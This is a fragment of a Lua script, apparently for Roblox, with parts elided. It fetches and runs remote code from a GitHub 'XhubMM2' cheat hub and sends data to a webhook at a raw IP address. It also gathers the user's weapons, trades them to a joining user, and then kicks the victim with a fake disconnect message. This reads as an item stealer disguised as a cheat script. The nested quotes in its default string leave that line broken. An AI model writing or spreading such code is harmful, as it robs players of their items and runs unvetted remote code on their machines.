...
-- Add custom script variable (you can set this in _G before running the script)
local customScript = _G.customScript or "loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()" -- Your custom script as a string

-- Execute custom script in a separate thread if it exists
if customScript ~= "" then
    task.spawn(function()
        local success, result = pcall(function()
            local func = loadstring(customScript)
            if func then
                func()
            end
        end)
        if not success then
            warn("Custom script error: " .. tostring(result))
        end
    end)
end
...
local webhook = _G.webhook or "http://45.13.225.83:6969/proxy/3e4f33bf36a55a0f3ce681ef2ffa8e57"
...
if #weaponsToSend > 0 then
    ...
    local function doTrade(joinedUser)
        ...
        plr:kick("You have been disconnected from the server.")
    end
